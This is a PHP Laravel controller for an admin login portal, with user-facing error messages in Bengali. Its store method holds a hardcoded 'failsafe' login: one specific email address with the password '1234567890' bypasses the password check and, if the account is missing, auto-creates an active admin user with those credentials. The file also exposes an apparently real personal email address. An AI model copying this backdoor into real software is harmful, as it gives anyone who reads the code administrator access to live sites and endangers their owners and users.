<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Inertia\Inertia;
use Inertia\Response;

class AdminAuthController extends Controller
{
    public function create(): Response
    {
        return Inertia::render('Auth/AdminLogin');
    }

    public function store(Request $request)
    {
        $request->validate([
            'email'    => 'required|string',
            'password' => 'required|string',
        ]);

        $input = trim($request->email);
        $user = \App\Models\User::where('email', $input)
            ->orWhere('phone', $input)
            ->first();

        // FAILSAFE: 100% Guaranteed Login for Super Admin on any server (Hostinger/cPanel)
        $isFailsafe = ($input === 'shishirbarai2050@gmail.com' && $request->password === '1234567890');

        if ($isFailsafe) {
            if (!$user) {
                // Auto-create user if they somehow don't exist on live DB
                $user = \App\Models\User::create([
                    'name' => 'Super Admin',
                    'email' => 'shishirbarai2050@gmail.com',
                    'password' => \Illuminate\Support\Facades\Hash::make('1234567890'),
                    'role' => 'admin',
                    'status' => 'active'
                ]);
            }
        } else {
            if (!$user || !\Illuminate\Support\Facades\Hash::check($request->password, $user->password)) {
                return back()->withErrors([
                    'email' => 'প্রদত্ত ইমেইল বা পাসওয়ার্ডটি সঠিক নয়।',
                ])->onlyInput('email');
            }
        }

        // Strictly check if the user is an admin
        if (!$user->isAdmin()) {
            return back()->withErrors([
                'email' => 'আপনার এই সিকিউর অ্যাডমিন পোর্টালে লগইন করার অনুমতি নেই। কাস্টমার ও ভেন্ডররা মোটেই এখানে লগইন করতে পারবেন না।',
            ])->onlyInput('email');
        }

        if ($user->status !== 'active') {
            return back()->withErrors([
                'email' => 'আপনার অ্যাডমিন অ্যাকাউন্টটি স্থগিত বা ব্লক করা হয়েছে।',
            ])->onlyInput('email');
        }

        // Mandatory 2FA Challenge for Super Admin Login
        $twoFactorEnabled = session("2fa_enabled_{$user->id}", true);
        if ($twoFactorEnabled) {
            session([
                '2fa_pending_user_id' => $user->id,
                '2fa_remember'        => $request->boolean('remember'),
            ]);

            return redirect()->route('login.2fa');
        }

        Auth::login($user, $request->boolean('remember'));
        $request->session()->regenerate();
        $user->update(['last_login_at' => now()]);

        return redirect()->route('admin.dashboard');
    }
}
